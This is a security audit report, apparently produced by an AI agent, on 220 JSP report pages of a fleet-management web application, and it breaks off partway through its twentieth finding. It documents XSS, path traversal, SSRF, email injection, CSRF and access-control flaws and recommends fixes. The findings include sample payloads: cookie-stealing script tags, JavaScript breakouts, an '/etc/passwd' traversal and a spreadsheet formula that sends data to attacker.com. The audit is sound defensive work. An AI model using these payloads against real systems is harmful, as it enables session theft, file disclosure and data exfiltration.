# Security Audit — reports/ JSP Files
**Audit ID:** A14
**Branch:** release/UAT_RELEASE_FLEETFOCUS_Production
**Date:** 2026-02-25
**Scope:** All JSP files under `reports/` (220 files)
**Auditor:** Agent A14

---

## Methodology

All 220 JSP files in `C:\Projects\cig-audit\repos\fleetfocus\reports\` were read and reviewed for:

1. **XSS (Cross-Site Scripting)** — unescaped `<%= %>` expressions in HTML output; reflected request parameters; DB data in HTML attribute or JavaScript contexts without encoding.
2. **SQL Injection** — request parameters concatenated into SQL in scriptlets (primary data access is via Java beans, so direct scriptlet SQL was also checked).
3. **Authorization / Data Scope** — session-based `access_level`, `access_cust`, `access_site`, `access_dept` scoping enforcement on the filter bean.
4. **CSRF** — state-modifying forms without anti-CSRF tokens.
5. **Email Injection** — user-supplied `mail_id` and `subject` parameters passed directly to mail-sending functions.
6. **Path Traversal** — user-supplied filenames concatenated into filesystem paths.
7. **SSRF** — user-supplied URL parameters fetched server-side.
8. **CSV/Formula Injection** — unescaped values in Excel export pages.

No use of `<c:out value="..."/>`, `${fn:escapeXml(...)}`, or any other output-encoding mechanism was found anywhere in the reports/ directory.

---

## Summary of Findings

| ID | File(s) | Category | Severity |
|----|---------|----------|----------|
| A14-1 | All rpt_* display pages (26 files) | Stored XSS — unescaped DB output | High |
| A14-2 | rpt_unit_unlock.jsp, rpt_unit_unlock_impact.jsp, rpt_unit_unlock_question.jsp, rpt_imp_set_lst.jsp, rpt_override_code_lst.jsp, rpt_email_configuration_report.jsp, rpt_messages_status.jsp, mail_conf.jsp | Reflected XSS — `message` parameter | High |
| A14-3 | rpt_impact_report.jsp, rpt_impact_photo_report.jsp | Reflected XSS — `search_crit` in input value attribute | Medium |
| A14-4 | rpt_user_summary.jsp | Reflected XSS — `sort_flg` in inline JavaScript onclick | High |
| A14-5 | rpt_impact_report.jsp, rpt_driver_util.jsp, rpt_impact_photo_report.jsp | XSS — request parameters in JS `onload` body attribute | Medium |
| A14-6 | rpt_driver_licence_expiry.jsp | XSS — request parameters in `<script>` block JS variable assignments | Medium |
| A14-7 | rpt_serv_maintenance.jsp, rpt_hour_counter.jsp, rpt_messages_status.jsp | Stored XSS — DB value injected into HTML attribute context | High |
| A14-8 | rpt_messages_status.jsp | Stored XSS — DB values injected into JS `onclick` handler | High |
| A14-9 | rpt_impact_photo_report.jsp | Stored XSS — image path from DB injected into JS `popImage()` call | Medium |
| A14-10 | rpt_blacklist_driv.jsp, rpt_blacklist_driv_au.jsp | Reflected XSS — `scr` parameter in AJAX URL string and hidden fields | Medium |
| A14-11 | mail_first.jsp, mail_conf.jsp, mail_conf_au.jsp | Reflected XSS — `url` parameter in hidden field value | Medium |
| A14-12 | mail_report.jsp | Email Injection — `mail_id` and `subject` from request passed directly to `sendMail()` | High |
| A14-13 | mail_report.jsp | SSRF — `url` parameter fetched server-side to construct email body | High |
| A14-14 | file_dl.jsp | Path Traversal — `customer`, `location`, `department`, `vehicle_cd`, `fileName` parameters concatenated into filesystem path | Critical |
| A14-15 | file_dl_url.jsp | Path Traversal — `filename` parameter concatenated directly into fixed base path | High |
| A14-16 | xlsx_report.jsp | Unvalidated parameter `rpt_name` passed to `ExcelUtil.getExcel()` | Medium |
| A14-17 | rpt_impact_avg_driver_rpt.jsp, rpt_impact_avg_hours_rpt.jsp | Missing access control — no `setAccess_level()` / `setAccess_cust()` scoping on filter bean | High |
| A14-18 | rpt_unit_unlock.jsp, rpt_unit_unlock_impact.jsp, rpt_unit_unlock_question.jsp | CSRF — state-modifying Save form with no anti-CSRF token | Medium |
| A14-19 | All excel_* export pages (approx. 30 files) | CSV/Formula Injection — unescaped DB values written to Excel output cells | Medium |
| A14-20 | rpt_driver_licence_expiry_detail.jsp | Missing access control — no `setAccess_level()` / session-scoping calls | High |
| A14-21 | display_report.jsp | Stored XSS — DB data output unescaped; `do_list` / `undo_list` / `sort_by` / `sort_asc` request parameters reflected into JS onclick handlers | Medium |
| A14-22 | rpt_imp_set_lst.jsp, rpt_override_code_lst.jsp | XSS — `get_cust`, `get_loc`, `get_dep` display names from DB output unescaped in heading | Medium |
| A14-23 | rpt_call_mail.jsp | Information Disclosure — `email` and `debug` parameters accepted with no authentication check on a batch mail trigger endpoint | Medium |

---

## Detailed Findings

---

### A14-1 — Stored XSS: Pervasive Unescaped Database Output Across All Report Pages

**Files:** Every `rpt_*` display JSP (at minimum the following 26 confirmed files):
- `rpt_daily_driver_summary.jsp`
- `rpt_daily_veh_summary.jsp`
- `rpt_curr_driv_report.jsp`
- `rpt_curr_unit_report.jsp`
- `rpt_impact_report.jsp`
- `rpt_driver_util.jsp`
- `rpt_blacklist_driv.jsp`
- `rpt_blacklist_driv_au.jsp`
- `rpt_driver_licence_expiry.jsp`
- `rpt_driver_licence_expiry_detail.jsp`
- `rpt_preop_chk.jsp`
- `rpt_preop_chk_fail.jsp`
- `rpt_preop_chk_inc.jsp`
- `rpt_utilisation.jsp`
- `rpt_unit_unlock.jsp`
- `rpt_driver_access_abuse.jsp`
- `rpt_serv_maintenance.jsp`
- `rpt_battery.jsp`
- `rpt_battery_change.jsp`
- `rpt_battery_charge.jsp`
- `rpt_user_summary.jsp`
- `rpt_impact_avg_driver_rpt.jsp`
- `rpt_email_configuration_report.jsp`
- `rpt_messages_status.jsp`
- `rpt_detail_operation.jsp`
- `rpt_hour_counter.jsp`
- `rpt_hourmeter_exception.jsp`
- `rpt_key_hour_util.jsp`
- `rpt_seat_hour_util.jsp`
- `rpt_unit_unlock_impact.jsp`
- `rpt_unit_unlock_question.jsp`
- `rpt_user_email_summary.jsp`
- `users_login_report.jsp`

**Severity:** High

**Category:** Cross-Site Scripting (Stored / Second-Order)

**Description:**
Every report page retrieves data from the database via Java beans and outputs it directly using `<%= expression %>` without any HTML encoding. No page in the `reports/` directory uses `<c:out value="..."/>`, `${fn:escapeXml(...)}`, `StringEscapeUtils.escapeHtml4()`, or any equivalent. If any DB field (fleet number, driver name, model name, department name, email address, message content, etc.) contains HTML special characters or a script payload, it will be rendered as raw HTML and executed by the browser of any user who views the report. Since these fields are populated from operator-supplied data (driver names, fleet numbers, department names configured through the administration screens), an attacker with access to configure any such record could inject a persistent XSS payload that executes for all users who subsequently view any affected report.

**Evidence (representative samples):**

`rpt_daily_driver_summary.jsp` lines 105, 128, 134:
```jsp
<%=field_nm %>
<%=dsum_driver_nm.get(i) %>
<%=temp %>
```

`rpt_battery_change.jsp` lines 102–124:
```jsp
<td><%=batteryBean.getUnit_nm() %>
<td><%=batteryBean.getBef_dri_nm() %>
<td><%=batteryBean.getAft_dri_nm() %>
```

`rpt_preop_chk.jsp` lines 102–131:
```jsp
<td><%=mach_nm.get(i) %>
<td><%=driv_nm.get(i) %>
<%=tmp%>   // inner_fail checklist item from DB
```

`users_login_report.jsp` lines 301–317:
```jsp
<td>  <%=user_fnm.get(i) %>
<td>  <%=user_lnm.get(i) %>
<td>  <%=loc_nm.get(i) %>
<td>  <%=dep_nm.get(i) %>
```

**Recommendation:**
Replace all `<%= expr %>` in HTML output contexts with `<c:out value="${expr}" escapeXml="true"/>` or wrap with `org.apache.commons.lang3.StringEscapeUtils.escapeHtml4(String)`. Add the JSTL tag library (`<%@ taglib uri="http://java.sun.com/jsp/jstl/functions" prefix="fn" %>`) to all report pages and apply `${fn:escapeXml(expr)}` throughout. This must be applied to every `<%= %>` expression that renders into HTML.

---

### A14-2 — Reflected XSS: `message` Request Parameter Echoed Into HTML

**Files:**
- `rpt_unit_unlock.jsp` line 119
- `rpt_unit_unlock_impact.jsp` line 128
- `rpt_unit_unlock_question.jsp` line 129
- `rpt_imp_set_lst.jsp` (parameter `message` read at line 30, no output found in snippet but used as pattern)
- `rpt_override_code_lst.jsp` (parameter `message` read at line 31)
- `rpt_email_configuration_report.jsp` lines 115–116
- `rpt_messages_status.jsp` lines 493, 554
- `mail_conf.jsp` line 302

**Severity:** High

**Category:** Cross-Site Scripting (Reflected)

**Description:**
Multiple pages accept a `message` GET/POST parameter and reflect it back into the page without any encoding. An attacker can craft a URL or form submission containing a `message` parameter with an XSS payload (e.g., `message=<script>document.cookie</script>`) and share it with an authenticated user. When the victim loads that URL, the script executes in their browser session.

**Evidence:**

`rpt_unit_unlock.jsp`:
```jsp
// Line 18:
String message = request.getParameter("message")==null?"":request.getParameter("message");
// Line 119:
<td align=center style="color: red" colspan="7" >  &nbsp; <%=message %></td>
```

`rpt_email_configuration_report.jsp`:
```jsp
// Line 28:
String message = request.getParameter("message")==null?"":request.getParameter("message");
// Line 115–116:
<tr><%=message %></tr>
```

`rpt_messages_status.jsp`:
```jsp
// Line 281:
String message = request.getParameter("message")==null?"":request.getParameter("message");
// Line 493:
<%=message %>
```

`mail_conf.jsp`:
```jsp
String message = request.getParameter("message")==null?"":request.getParameter("message");
// Line 302:
<td align=center style="color: red"><%=message %></td>
```

**Recommendation:**
HTML-encode the `message` parameter before output: `<c:out value="${param.message}" escapeXml="true"/>`. Consider using a server-side flash message mechanism that does not accept raw HTML from the URL.

---

### A14-3 — Reflected XSS: `search_crit` Parameter in Input Value Attribute

**Files:**
- `rpt_impact_report.jsp` line 560
- `rpt_impact_photo_report.jsp` line 487

**Severity:** Medium

**Category:** Cross-Site Scripting (Reflected)

**Description:**
The `search_crit` request parameter is accepted and reflected directly into an HTML `<input>` tag's `value` attribute without encoding. If the value contains `"` or `>`, an attacker can break out of the attribute context and inject HTML or JavaScript.

**Evidence:**

`rpt_impact_report.jsp`:
```jsp
// Line 340 (approx):
String search_crit = request.getParameter("search_crit")==null?"":request.getParameter("search_crit");
// Line 560:
<input type="text" name="sc" value="<%=search_crit %>" />
```

`rpt_impact_photo_report.jsp`:
```jsp
// Line 277:
String search_crit = request.getParameter("search_crit")==null?"":request.getParameter("search_crit");
// Line 487:
<input type="text" name="sc" value="<%=search_crit %>" />
```

**Recommendation:**
HTML-encode the value before rendering into the attribute: `value="<c:out value="${param.search_crit}" escapeXml="true"/>"`.

---

### A14-4 — Reflected XSS: `sort_flg` Parameter in Inline JavaScript onclick Handler

**Files:**
- `rpt_user_summary.jsp` lines 113–128

**Severity:** High

**Category:** Cross-Site Scripting (Reflected — JavaScript context)

**Description:**
The `sort_flg` request parameter is reflected directly into an inline JavaScript `onclick` event handler without any encoding. An attacker can inject arbitrary JavaScript by supplying a value such as `sort_flg=');alert(1);//`. Since `sort_flg` controls a sort toggle and is likely set by clicking column headers, the payload would execute for any user who clicks a sortable column header.

**Evidence:**

`rpt_user_summary.jsp`:
```jsp
String sort_flg = request.getParameter("sort_flg")==null?"asc":request.getParameter("sort_flg");
// Lines 113–128 (column header cells):
onclick=sort_by('c1','<%=sort_flg %>');
```

**Recommendation:**
Validate `sort_flg` against an allowlist (`"asc"` or `"desc"` only) and reject any other value. Do not interpolate request parameters into JavaScript event handlers.

---

### A14-5 — XSS: Request Parameters Interpolated Into JavaScript `onload` Body Handler

**Files:**
- `rpt_impact_report.jsp` line 442
- `rpt_driver_util.jsp` line 357
- `rpt_impact_photo_report.jsp` line 376

**Severity:** Medium

**Category:** Cross-Site Scripting (Reflected — JavaScript context)

**Description:**
Request parameters `user_cd`, `loc_cd`, `dept_cd`, `sev`, etc. are interpolated as bare string literals into a JavaScript `onload` attribute on the `<body>` tag. An attacker who can control these parameters (e.g., via a crafted URL) can inject JavaScript. Although these are filter-type parameters expected to be numeric or short codes, they are not validated before interpolation.

**Evidence:**

`rpt_impact_report.jsp`:
```jsp
<body bgcolor="white" onload="set('<%=user_cd %>','<%=loc_cd %>','<%=dept_cd %>','<%=sev %>')">
```

`rpt_driver_util.jsp`:
```jsp
<body bgcolor="white" onload="set('<%=user_cd %>','<%=loc_cd %>','<%=model_cd %>','<%=fld_cd %>')">
```

`rpt_impact_photo_report.jsp`:
```jsp
<body bgcolor="white" onload="set('<%=user_cd %>','<%=loc_cd %>','<%=dept_cd %>','<%=sev %>')">
```

**Recommendation:**
Before interpolating into JavaScript string literals, apply JavaScript string encoding (e.g., `StringEscapeUtils.escapeEcmaScript(value)`). Better: validate that `user_cd`, `loc_cd`, `dept_cd` match expected patterns (alphanumeric / numeric only) server-side and reject otherwise.

---

### A14-6 — XSS: Request Parameters in `<script>` Block Variable Assignments

**Files:**
- `rpt_driver_licence_expiry.jsp` lines 446–449

**Severity:** Medium

**Category:** Cross-Site Scripting (Reflected — JavaScript context)

**Description:**
Request parameters `user_cd`, `loc_cd`, `dept_cd`, and `form_cd` are interpolated directly into JavaScript `var` declarations inside a `<script>` block. If any of these values contain a single quote or other JavaScript metacharacter, an attacker can break out of the string context and execute arbitrary JavaScript.

**Evidence:**

`rpt_driver_licence_expiry.jsp`:
```jsp
var cust_cd = '<%= user_cd%>';
var loc_cd = '<%= loc_cd%>';
var dept_cd = '<%= dept_cd%>';
var form_cd = '<%=form_cd%>';
```

**Recommendation:**
Apply `StringEscapeUtils.escapeEcmaScript()` to each value before interpolation, or use JSON encoding. Validate these parameters to expected patterns (numeric or alphanumeric) before use.

---

### A14-7 — Stored XSS: DB Value Injected Into HTML Attribute Context

**Files:**
- `rpt_serv_maintenance.jsp` line 107
- `rpt_hour_counter.jsp` line 88
- `rpt_messages_status.jsp` line 544

**Severity:** High

**Category:** Cross-Site Scripting (Stored — HTML attribute injection)

**Description:**
Database-sourced values (`sm_color`, `sm_color` from `getSm_color()`, and `msg_col` from `getMsg_col()`) are written directly into HTML `<td>` attributes without encoding. If a record in the database contains a crafted color value such as `style='background:red' onmouseover='alert(1)'`, this injects arbitrary HTML attributes or event handlers into the rendered page. An attacker with access to configure vehicle or message color settings in the backend could exploit this for persistent XSS.

**Evidence:**

`rpt_serv_maintenance.jsp`:
```jsp
// Line 107:
<td <%=sm_color.get(i)%>><b><%=sm_next_due.get(i) %></b>
```

`rpt_hour_counter.jsp`:
```jsp
// Line 88:
<td <%=sm_color.get(i)%>>
<%= sm_hour_meter_ts.get(i)%>
```

`rpt_messages_status.jsp`:
```jsp
// Line 544:
<td style="background-color:<%=msg_col.get(i) %>">
```

**Recommendation:**
Store color codes as validated CSS color values (e.g., hex `#RRGGBB` or named colors) and validate them server-side in the bean before returning to the JSP. In the JSP, encode the color value with `<c:out escapeXml="true"/>`. Prefer using CSS class names rather than inline style injection from DB values.

---

### A14-8 — Stored XSS: DB Values Injected Into JavaScript onclick Handler

**Files:**
- `rpt_messages_status.jsp` line 546

**Severity:** High

**Category:** Cross-Site Scripting (Stored — JavaScript context)

**Description:**
Database-sourced values (message code, message content, and vehicle hire number) are interpolated directly into a JavaScript `onclick` event handler as string arguments. If any of these values contains a single quote or other JavaScript metacharacter, an attacker who can control message content or vehicle hire numbers in the database can inject arbitrary JavaScript that executes when any user clicks the "Resend" link for that message.

**Evidence:**

`rpt_messages_status.jsp`:
```jsp
// Line 546:
onclick="resend('<%=msg_cd.get(i) %>','<%=msg.get(i) %>','<%=veh_hn.get(i) %>');"
```

**Recommendation:**
Apply `StringEscapeUtils.escapeEcmaScript()` to each value before interpolation into the `onclick` handler. Alternatively, use `data-*` attributes and attach event listeners in external JavaScript, keeping DB data out of inline event handlers entirely.

---

### A14-9 — Stored XSS: Impact Photo Path From DB Injected Into JS Function Call

**Files:**
- `rpt_impact_photo_report.jsp` line 593

**Severity:** Medium

**Category:** Cross-Site Scripting (Stored — JavaScript context)

**Description:**
The image link path retrieved from the database is concatenated into a `javascript:popImage(...)` href. If the image filename contains JavaScript metacharacters (single quote, parenthesis, etc.), an attacker who can control the stored image filename could inject JavaScript code that executes when a user clicks the "View" link.

**Evidence:**

`rpt_impact_photo_report.jsp`:
```jsp
// Line 588–593:
<% tmp = "../"+ RuntimeConf.impactDir+"/"+img_link.get(j);
   if(img_link.get(j) == null ||img_link.get(j).equals("")){
   %>
   <td>&nbsp;</td>
 <%}else{%>
   <td><a href="javascript:popImage('<%=tmp%>','Impact Image')">View</a></td>
```

**Recommendation:**
Apply `StringEscapeUtils.escapeEcmaScript()` to `tmp` before interpolating into the JavaScript call. Validate and sanitize image filenames at ingestion time to allow only safe characters.

---

### A14-10 — Reflected XSS: `scr` Parameter in AJAX URL Construction and Hidden Fields

**Files:**
- `rpt_blacklist_driv.jsp` lines 35, 132–135
- `rpt_blacklist_driv_au.jsp` (same pattern)

**Severity:** Medium

**Category:** Cross-Site Scripting (Reflected)

**Description:**
The `scr` (search criteria) request parameter is read from the URL and injected directly into a JavaScript AJAX URL string and into hidden input field `value` attributes without encoding. An attacker can craft a URL containing `scr="+alert(1)+"` or `scr="><script>alert(1)</script>` to achieve XSS in the JavaScript context or HTML attribute context respectively.

**Evidence:**

`rpt_blacklist_driv.jsp`:
```jsp
// Line 58:
String scr = request.getParameter("scr")==null?"":request.getParameter("scr");
// Line 35 (inside <script> block):
ajax: 'get_driverblacklist.jsp?cust_cd='+cust_cd+"&loc_cd="+loc_cd+"&dept_cd="+dept_cd+"&scr="+scr
// Lines 132–135:
<input type="hidden" name="cust_cd" value="<%=cust_cd%>">
<input type="hidden" name="loc_cd" value="<%=loc_cd%>">
<input type="hidden" name="dept_cd" value="<%=dept_cd%>">
<input type="hidden" name="scr" value="<%=scr%>">
```

**Recommendation:**
Encode `scr` with `StringEscapeUtils.escapeEcmaScript()` before using in JavaScript contexts. Encode with HTML escaping before placing in `value` attributes. Validate the search criteria to a safe character set server-side.

---

### A14-11 — Reflected XSS: `url` Parameter Reflected Into Hidden Field Value

**Files:**
- `mail_first.jsp` line 145
- `mail_conf.jsp` line 308

**Severity:** Medium

**Category:** Cross-Site Scripting (Reflected)

**Description:**
The `url` request parameter is accepted and reflected back unencoded into a hidden `<input>` field's `value` attribute. A value containing `"` or `>` can break out of the attribute context and inject HTML or JavaScript.

**Evidence:**

`mail_first.jsp`:
```jsp
// Line 11:
String url = request.getParameter("url")==null?"":request.getParameter("url");
// Line 145:
<input type="hidden" name="url" value="<%=url %>">
```

`mail_conf.jsp`:
```jsp
// Line 121:
String url = request.getParameter("url")==null?"":request.getParameter("url");
// Line 308:
<input type="hidden" name="url" value="<%=url%>">
```

**Recommendation:**
HTML-encode the `url` value before placing it into the `value` attribute: `<c:out value="${param.url}" escapeXml="true"/>`. Validate that the URL conforms to an expected pattern (relative path within the application) before accepting it.

---

### A14-12 — Email Injection: `mail_id` and `subject` From Request Passed Directly to `sendMail()`

**Files:**
- `mail_report.jsp` lines 24–25, 44

**Severity:** High

**Category:** Email Injection

**Description:**
The `mail_id` (recipient email address) and `subject` parameters are taken directly from the HTTP request and passed without sanitization to `mobj.sendMail(subject, data, group_id, mail_id, sName, sEmail)`. An attacker who can reach this endpoint can supply arbitrary email addresses as recipients and inject newlines into the subject to add additional headers (e.g., `Cc:`, `Bcc:`, `To:` headers), effectively turning this into an open mail relay or enabling spam/phishing abuse. The endpoint appears to be callable without CSRF protection (no token visible).

**Evidence:**

`mail_report.jsp`:
```jsp
// Lines 24–25:
String mail_id=request.getParameter("mail_id");
String subject=request.getParameter("subject");
// Line 44:
mobj.sendMail(subject,data,group_id,mail_id,sName,sEmail);
// Line 52:
<%=mail_id%>
```

**Recommendation:**
1. Validate `mail_id` against a strict email address regex and reject any value containing newline characters (`\r`, `\n`).
2. Strip or reject newline characters from `subject`.
3. Consider restricting `mail_id` to a list of addresses associated with the authenticated user's account rather than accepting arbitrary addresses.
4. Require a valid CSRF token on this endpoint.

---

### A14-13 — SSRF: `url` Parameter Fetched Server-Side to Construct Email Body

**Files:**
- `mail_report.jsp` lines 15–19

**Severity:** High

**Category:** Server-Side Request Forgery (SSRF)

**Description:**
The `url` request parameter (which carries the path to a report page to email) is appended to a server-side base URL (`LindeConfig.emailurl`) and fetched by the server to obtain the HTML content for the email body. An attacker who can control the `url` parameter could point it at an internal network resource or a path outside the intended reports directory, causing the server to fetch and email sensitive internal content.

**Evidence:**

`mail_report.jsp`:
```jsp
// Line 15:
String url = request.getParameter("url")==null?"":request.getParameter("url");
// Line 19:
url= LindeConfig.emailurl+"/reports/"+url;
```
(The server then fetches `url` and uses the response as the email body.)

**Recommendation:**
1. Validate that the `url` parameter matches a strict allowlist of permitted report page names (e.g., matches the pattern `[a-zA-Z0-9_]+\.jsp\?[a-zA-Z0-9_%&=.+-]+`).
2. Reject any value containing `..`, `://`, or any characters not expected in a relative report URL.
3. Construct the fetch URL solely from server-side known values; do not accept the page path from client input.

---

### A14-14 — Path Traversal: Multiple Request Parameters Concatenated Into Filesystem Path

**Files:**
- `file_dl.jsp` lines 4–16

**Severity:** Critical

**Category:** Path Traversal / Arbitrary File Read

**Description:**
`file_dl.jsp` accepts five request parameters — `customer`, `location`, `department`, `vehicle_cd`, and `fileName` — and concatenates them directly into a filesystem path without any validation or sanitization:

```java
String filepath = "/home/gmtp/fms_files/CFTS/"+customer+"/"+location+"/"+department+"/"+vehicle_cd+"/";
java.io.FileInputStream fileInputStream = new java.io.FileInputStream(filepath+fileName);
```

An attacker can supply `../` sequences in any of these parameters to traverse outside the intended directory and read arbitrary files from the server filesystem (e.g., `/etc/passwd`, application configuration files, private keys). The file content is streamed directly to the HTTP response with `Content-Disposition: attachment`.

There is no check that the session is authenticated within the visible code of this file (no `Expire.jsp` include, no session check).

**Evidence:**

`file_dl.jsp`:
```jsp
String fileName = request.getParameter("fileName") == null ? "" : request.getParameter("fileName");
String vehicle_cd = request.getParameter("vehicle_cd") == null ? "" : request.getParameter("vehicle_cd");
String customer = request.getParameter("customer") == null ? "" : request.getParameter("customer");
String location = request.getParameter("location") == null ? "" : request.getParameter("location");
String department = request.getParameter("department") == null ? "" : request.getParameter("department");

String filepath = "/home/gmtp/fms_files/CFTS/"+customer+"/"+location+"/"+department+"/"+vehicle_cd+"/";
response.setContentType("APPLICATION/OCTET-STREAM");
response.setHeader("Content-Disposition","attachment; filename=\"" + fileName + "\"");
java.io.FileInputStream fileInputStream=new java.io.FileInputStream(filepath+fileName);
```

**Recommendation:**
1. Add session authentication check at the top of the file.
2. Canonicalize the resolved path using `File.getCanonicalPath()` and verify it starts with the expected base directory before opening.
3. Validate each path component parameter (`customer`, `location`, `department`, `vehicle_cd`, `fileName`) against a strict allowlist pattern (alphanumeric, hyphens, underscores only; no slashes, dots, or backslashes).
4. Example safe check:
   ```java
   File baseDir = new File("/home/gmtp/fms_files/CFTS/").getCanonicalFile();
   File requestedFile = new File(filepath + fileName).getCanonicalFile();
   if (!requestedFile.getPath().startsWith(baseDir.getPath())) {
       response.sendError(403); return;
   }
   ```

---

### A14-15 — Path Traversal: `filename` Parameter Concatenated Into Filesystem Path

**Files:**
- `file_dl_url.jsp` lines 2–14

**Severity:** High

**Category:** Path Traversal / Arbitrary File Read

**Description:**
`file_dl_url.jsp` accepts a `filename` request parameter and concatenates it directly to a fixed base path `/home/gmtp/fms_files/licence/` without validation. An attacker can supply `../../etc/passwd` as the `filename` value to read files outside the intended directory. Like `file_dl.jsp`, no authentication check is visible in the file.

**Evidence:**

`file_dl_url.jsp`:
```jsp
String filename = request.getParameter("filename") == null ? "" : request.getParameter("filename");
String filepath = "/home/gmtp/fms_files/licence/";
java.io.FileInputStream fileInputStream=new java.io.FileInputStream(filepath + filename);
```

**Recommendation:**
Same as A14-14: canonicalize and verify the resulting path is within the base directory. Validate `filename` to a safe pattern. Add authentication check.

---

### A14-16 — Unvalidated Report Name Parameter Passed to `ExcelUtil.getExcel()`

**Files:**
- `xlsx_report.jsp` lines 17–21

**Severity:** Medium

**Category:** Insufficient Input Validation

**Description:**
The `rpt_name` request parameter is accepted without validation and passed directly to `ExcelUtil.getExcel(rpt_name, param, response)`. Depending on the implementation of `getExcel()`, this could allow an attacker to request an unintended report type, cause unexpected server behaviour, or (if `rpt_name` is used to construct a file path) enable path traversal. The `params` parameter is also passed without visible validation, though its impact depends on the `ExcelUtil` implementation.

**Evidence:**

`xlsx_report.jsp`:
```jsp
String param = request.getParameter("params")==null?"":request.getParameter("params");
String rpt_name = request.getParameter("rpt_name")==null?"":request.getParameter("rpt_name");
ExcelUtil util = new ExcelUtil();
util.getExcel(rpt_name,param,response);
```

**Recommendation:**
Validate `rpt_name` against a strict allowlist of known report identifiers before passing to `ExcelUtil`. Review the `ExcelUtil.getExcel()` implementation to confirm it does not use `rpt_name` in a file path or SQL query without sanitization.

---

### A14-17 — Missing Access Control: No Session Scoping on Filter Bean

**Files:**
- `rpt_impact_avg_driver_rpt.jsp` (lines 148–169 — no `setAccess_level()` calls)
- `rpt_impact_avg_hours_rpt.jsp` (lines 155–169 — no `setAccess_level()` calls)

**Severity:** High

**Category:** Broken Access Control / Authorization Bypass

**Description:**
Every other report page reads `access_level`, `access_cust`, `access_site`, `access_dept` from the session and passes them to the filter bean via `setAccess_level()`, `setAccess_cust()`, `setAccess_site()`, `setAccess_dept()` before calling `filter.init()`. This is the mechanism by which customers are restricted to seeing only their own data.

`rpt_impact_avg_driver_rpt.jsp` and `rpt_impact_avg_hours_rpt.jsp` do not call any of these setter methods. The filter bean is called with `filter.init()` directly. Depending on the bean's default values, this may result in all impact data for all customers being returned, allowing a lower-privileged or multi-tenant user to see other customers' driver impact statistics.

**Evidence:**

`rpt_impact_avg_driver_rpt.jsp`:
```jsp
// Lines 155–169: standard params set but NO access scoping:
filter.setSet_opcode(op_code);
filter.setSet_gp_cd(gp_cd);
filter.setSet_cust_cd(user_cd);
filter.setSet_loc_cd(loc_cd);
filter.setSet_dept_cd(dept_cd);
filter.setSet_form_cd(form_cd);
filter.init();
// Missing: filter.setAccess_level(), setAccess_cust(), setAccess_site(), setAccess_dept()
```

`rpt_impact_avg_hours_rpt.jsp`:
```jsp
// Lines 163–169: same pattern, no access scoping calls.
filter.setSet_opcode(op_code);
filter.setSet_gp_cd(gp_cd);
filter.setSet_cust_cd(user_cd);
filter.setSet_loc_cd(loc_cd);
filter.setSet_dept_cd(dept_cd);
filter.setSet_form_cd(form_cd);
filter.init();
```

**Recommendation:**
Add the standard access control block to both files:
```java
String access_level = (String)session.getAttribute("access_level");
String access_cust = (String)session.getAttribute("access_cust");
String access_site = (String)session.getAttribute("access_site");
String access_dept = (String)session.getAttribute("access_dept");
if(access_level.equalsIgnoreCase("")) { access_level = "5"; }
filter.setAccess_level(access_level);
filter.setAccess_cust(access_cust);
filter.setAccess_site(access_site);
filter.setAccess_dept(access_dept);
```
before calling `filter.init()`, consistent with all other report pages.

---

### A14-18 — CSRF: State-Modifying Save Form Without Anti-CSRF Token

**Files:**
- `rpt_unit_unlock.jsp` lines 115–117
- `rpt_unit_unlock_impact.jsp` lines 122–126
- `rpt_unit_unlock_question.jsp` lines 122–126

**Severity:** Medium

**Category:** Cross-Site Request Forgery

**Description:**
All three unit-unlock report pages contain a form with a "Save" submit button that writes unlock reason text back to the database (via `../servlet/Frm_security` or equivalent). The form does not contain an anti-CSRF token. An attacker who can lure an authenticated user to a malicious page can submit this form on their behalf, writing attacker-controlled unlock reason text (or triggering a save operation) without the user's knowledge. The form method is not explicitly set in the HTML table (it depends on the enclosing form from the included header), but the submit action is state-modifying.

**Evidence:**

`rpt_unit_unlock.jsp`:
```jsp
// Lines 113–117:
<tfoot>
<tr>
<td colspan="7" align="center">
  <input type="submit" value="Save"/>
</td>
</tr>
```
No `<input type="hidden" name="csrf_token" value="...">` present.

**Recommendation:**
Implement a synchronizer token pattern: generate a random CSRF token per session, store it in the session, include it as a hidden field in all state-modifying forms, and validate it on the server before processing any save/delete/update operation. The Spring Security or OWASP CSRF Guard libraries provide this.

---

### A14-19 — CSV/Formula Injection: Unescaped DB Values in Excel Export Pages

**Files:** All `excel_*` pages including (at minimum):
- `excel_impact_report.jsp`
- `excel_daily_driver_summary.jsp`
- `excel_driver_util.jsp`
- `excel_battery.jsp`
- `excel_battery_change.jsp`
- `excel_battery_charge.jsp`
- `excel_curr_driv_report.jsp`
- `excel_curr_unit_report.jsp`
- `excel_driver_access_abuse.jsp`
- `excel_preop_chk.jsp`
- `excel_serv_maintenance.jsp`
- `excel_unit_unlock.jsp`
- `excel_hourmeter_exception.jsp`
- `excel_hour_counter.jsp`
- `excel_key_hour_util.jsp`
- `excel_impact_meter_report.jsp`
- `excel_inspection_report.jsp`
- `excel_monthly_online.jsp`
- `excel_per_driver_summary.jsp`
- `excel_per_veh_summary.jsp`
- `excel_seat_hour_util.jsp`
- `excel_shock_summary.jsp`
- `excel_users_login_report.jsp`
- `excel_util_summary.jsp`
- `excel_util_wow.jsp`

**Severity:** Medium

**Category:** CSV/Formula Injection

**Description:**
All Excel export pages output database values directly as HTML table cell content (with Content-Type `application/vnd.ms-excel`). If any database field (such as a driver name, department name, or fleet number) begins with `=`, `+`, `-`, or `@`, spreadsheet applications (Excel, LibreOffice) may interpret the cell content as a formula when the exported file is opened. An attacker with the ability to set their own driver name or a fleet number in the system could embed a formula such as `=HYPERLINK("http://attacker.com/?"&A1,"Click")` that exfiltrates data when another user opens the exported spreadsheet.

**Evidence:**

`excel_daily_driver_summary.jsp` (representative):
```jsp
// Driver name and field name output directly into <td> cells:
<%=field_nm %>
<%=dsum_driver_nm.get(i) %>
```
Content-Type header: `application/vnd.ms-excel` (set in included header).

**Recommendation:**
Before writing any value to an Excel cell, check if it starts with `=`, `+`, `-`, or `@` and prefix it with a single quote (`'`) to force the value to be treated as text. Alternatively, use a proper Excel library (Apache POI) via the `xlsx_report.jsp` / `ExcelUtil` path, which handles cell typing correctly.

---

### A14-20 — Missing Access Control on Detail Drill-Down Page

**Files:**
- `rpt_driver_licence_expiry_detail.jsp`

**Severity:** High

**Category:** Broken Access Control

**Description:**
